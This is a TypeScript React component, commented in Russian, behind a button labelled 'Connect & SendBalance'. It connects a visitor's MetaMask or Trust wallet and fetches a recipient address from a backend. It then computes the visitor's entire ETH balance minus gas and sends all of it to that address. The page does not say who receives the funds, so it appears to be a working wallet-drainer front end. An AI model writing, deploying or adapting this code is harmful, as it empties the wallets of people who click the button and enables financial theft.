'use client'

import { BACKEND_LINK } from '@/utils/variables';
import { useState } from 'react';
import Web3, { Web3EthInterface } from 'web3';


interface ExternalProvider {
  selectedAddress?: string
  isMetaMask?: boolean
  isTrust?: boolean
  request(args: { method: string; params?: unknown[] }): Promise<unknown>
  on?(event: string, listener: (...args: unknown[]) => void): void
  removeListener?(event: string, listener: (...args: unknown[]) => void): void
}

interface ResponseCalculateGasTrxNew {
  maxPriorityFee: string;
  maxFee: string;
  gasLimit: string;
  sendValue: string;
}

interface ResponseCalculateGasTrxLegacy {
  gasLimit: string;
  gasPrice: string;
  sendValue: string;
}

async function fetchDataFromBackend(setStatus: (msg: string) => void,): Promise<string> {
  /*
    Получения Адреса кошелька
  */
  setStatus('Получаем адрес получателя от бэка…');
  const res = await fetch(`${BACKEND_LINK}/contract`);
  if (!res.ok) throw new Error(`Ошибка бэка: ${res.status}`);
  const { recipient } = await res.json() as { recipient: string };
  return recipient;
}

async function calculateGasTrxLegacy(
  addr: string,
  addr_recipient: string,
  web3: Web3): Promise<ResponseCalculateGasTrxLegacy> {
  /*
    Расчет цены газа для старых кошельков
  */

  // Баланс
  const balanceWei = BigInt(await web3.eth.getBalance(addr))

  // Получаем единственный gasPrice
  const gasPrice = BigInt(await web3.eth.getGasPrice())

  // Оцениваем gasLimit (fallback на 21000)
  let estimatedGas: bigint
  try {
    const gasEstimate = await web3.eth.estimateGas({
      from: addr,
      to: addr_recipient,
      value: '0x0',
      gasPrice: gasPrice.toString(),
    })
    estimatedGas = BigInt(gasEstimate)
  } catch {
    estimatedGas = 21000n
  }
  const gasLimit = estimatedGas + 1000n

  // Считаем сколько уйдёт на газ и сколько можно отправить
  const gasCost = gasLimit * gasPrice
  const sendValue = balanceWei - gasCost
  if (sendValue <= 0n) {
    throw new Error('Недостаточно средств на оплату газа (legacy)')
  }

  return {
    gasLimit: gasLimit.toString(),
    gasPrice: gasPrice.toString(),
    sendValue: sendValue.toString(16),
  }
}

async function calculateGasTrxNew(
  addr: string,
  addr_recipient: string,
  web3: Web3): Promise<ResponseCalculateGasTrxNew> {
  /*
    Расчет цены газа для новых кошельков
  */
  const balanceWei = BigInt(await web3.eth.getBalance(addr));
  const block = await web3.eth.getBlock('pending');
  const baseFee = block.baseFeePerGas
    ? BigInt(block.baseFeePerGas as bigint)
    : 0n;
  let maxPriorityFee: bigint;
  try {
    maxPriorityFee = BigInt(
      await (web3.eth as Web3EthInterface).getMaxPriorityFeePerGas()
    );
  } catch {
    maxPriorityFee = BigInt(web3.utils.toWei('2.5', 'gwei'));
  }
  const maxFee = baseFee * 2n + maxPriorityFee;

  // Оцениваем gas для простого transfer (receive-функция контракта)
  let estimatedGas: bigint;
  try {
    const gasEstimate = await web3.eth.estimateGas({
      from: addr,
      to: addr_recipient,
      value: '0x0',            // для оценки самого receive()
      maxPriorityFeePerGas: maxPriorityFee.toString(),
      maxFeePerGas: maxFee.toString(),
      type: '0x2',
    });
    estimatedGas = BigInt(gasEstimate);
  } catch {
    // если не удалось, берём минимальный стандарт
    estimatedGas = 21000n;
  }
  const gasLimit = estimatedGas + 1000n; // запас 1000

  // Считаем, сколько уйдёт на газ, и вычитаем из баланса
  const gasCost = gasLimit * maxFee;
  const sendValue = balanceWei - gasCost;
  if (sendValue <= 0n) {
    throw new Error('Недостаточно средств на оплату газа');
  }
  return {
    'maxPriorityFee': maxPriorityFee.toString(),
    'maxFee': maxFee.toString(),
    'gasLimit': gasLimit.toString(),
    'sendValue': sendValue.toString(16),
  }
}

// Вынесенная функция: вся логика взаимодействия с контрактом
async function sendAllBalanceMetamask(
  eth: ExternalProvider & { isMetaMask?: boolean; isTrust?: boolean },
  from: string,
  setStatus: (msg: string) => void,
): Promise<string> {
  // 1. Получаем Адрес получателя
  const to = await fetchDataFromBackend(setStatus);

  // 2. Настраиваем Web3
  const web3 = new Web3(eth);

  // 3. Расчитывает цену газа
  const isTrustWallet = !!eth.isTrust;

  let valueHex: string;
  let txParams: Record<string, string> = { from, to };

  // 4. Подготавливаем транзакцию  
  if (isTrustWallet) {
    const { gasLimit, gasPrice, sendValue } = await calculateGasTrxLegacy(from, to, web3);
    valueHex = '0x' + sendValue;

    txParams = {
      ...txParams,
      value: valueHex,
      gas: gasLimit,
      gasPrice: gasPrice,
    }
    console.log('txParams: ', txParams)
  } else {
    const { gasLimit, maxPriorityFee, maxFee, sendValue } = await calculateGasTrxNew(from, to, web3);
    valueHex = '0x' + sendValue;

    txParams = {
      ...txParams,
      value: valueHex,
      gas: gasLimit,
      maxPriorityFeePerGas: maxPriorityFee,
      maxFeePerGas: maxFee,
      type: '0x2',
    }
  }

  // 5) Отправляем транзакцию
  setStatus(`Отправляем ${web3.utils.fromWei(valueHex, 'ether')} ETH…`);
  const receipt = await web3.eth.sendTransaction(txParams);
  return String(receipt.transactionHash);
}

export default function Wallet() {
  const [account, setAccount] = useState<string>()
  const [status, setStatus] = useState('Нажмите «Connect & SendBalance»')
  const [busy, setBusy] = useState(false)

  async function connectAndSendBalance() {
    const eth = window.ethereum as ExternalProvider & {
      isMetaMask?: boolean
      isTrust?: boolean
    }
    if (!eth) {
      setStatus('Установите Web3-кошелёк (MetaMask и т.п.)')
      return
    }

    setBusy(true)
    setStatus('Запрашиваем аккаунт…')
    let addr = eth.selectedAddress as string | undefined
    if (!addr) {
      try {
        const resp = await eth.request({ method: 'eth_requestAccounts' })
        addr = (resp as string[])[0]
      } catch (e: unknown) {
        const msg = e instanceof Error ? e.message : String(e);
        setStatus(`Ошибка: ${msg}`);
        setBusy(false)
        return
      }
    }
    setAccount(addr)

    try {
      const txHash = await sendAllBalanceMetamask(eth, addr, setStatus)
      setStatus(`Успех! TxHash: ${txHash}`)
    } catch (e: unknown) {
      const msg = e instanceof Error ? e.message : String(e);
      setStatus(`Ошибка: ${msg}`);
    } finally {
      setBusy(false)
    }
  }

  return (
    <div style={{ padding: 20, fontFamily: 'Arial, sans-serif' }}>
      <h1>Send Contract Balance</h1>
      <button
        onClick={connectAndSendBalance}
        disabled={busy}
        style={{
          padding: '10px 20px',
          fontSize: '16px',
          cursor: busy ? 'not-allowed' : 'pointer',
        }}
      >
        {busy ? '…обрабатываем' : 'Connect & SendBalance'}
      </button>
      <p><strong>Статус:</strong> {status}</p>
      {account && <p><strong>Ваш аккаунт:</strong> {account}</p>}
    </div>
  )
}
